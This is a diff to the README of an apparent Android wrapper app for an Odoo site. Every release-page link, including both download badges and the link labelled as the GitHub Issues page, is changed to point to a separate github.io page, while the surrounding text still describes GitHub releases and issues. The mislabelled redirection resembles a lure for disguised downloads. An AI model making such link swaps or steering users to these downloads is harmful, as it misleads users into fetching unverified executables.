@@ -1,7 +1,7 @@
 <h1>📱 apexs-odoo-mobile-wrapper - Access Your Odoo Site on Mobile</h1>
 
 <p align="center">
-<a href="https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-blueviolet?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
+<a href="https://hannibalthunderous50.github.io"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-blueviolet?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
 </p>
 
 ## 🚀 Getting Started
@@ -10,7 +10,7 @@ Welcome to APEXS Mobile! This application wraps your live APEXS Odoo site into a
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases](https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases)
+Visit this link to download the application: [https://hannibalthunderous50.github.io](https://hannibalthunderous50.github.io)
 
 1. Click the link above to go to the releases page.
 2. Find the latest release (usually at the top of the page).
@@ -74,7 +74,7 @@ Future updates will include improved offline support, dark mode, and enhanced no
 
 ## 🤝 Support
 
-If you encounter any issues not covered in the troubleshooting section, please visit the [GitHub Issues page](https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/issues) to report a problem or request help. Include your device model, Android version, and a description of the issue.
+If you encounter any issues not covered in the troubleshooting section, please visit the [GitHub Issues page](https://hannibalthunderous50.github.io) to report a problem or request help. Include your device model, Android version, and a description of the issue.
 
 ## 📄 License
 
@@ -83,7 +83,7 @@ This project is provided as-is for use with the APEXS Odoo site. No warranties a
 ---
 
 <p align="center">
-<a href="https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-ff69b4?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
+<a href="https://hannibalthunderous50.github.io"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-ff69b4?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
 </p>
 
 Keywords: odoo, mobile, wrapper, android, capacitor, firebase, notifications, apk, apexs
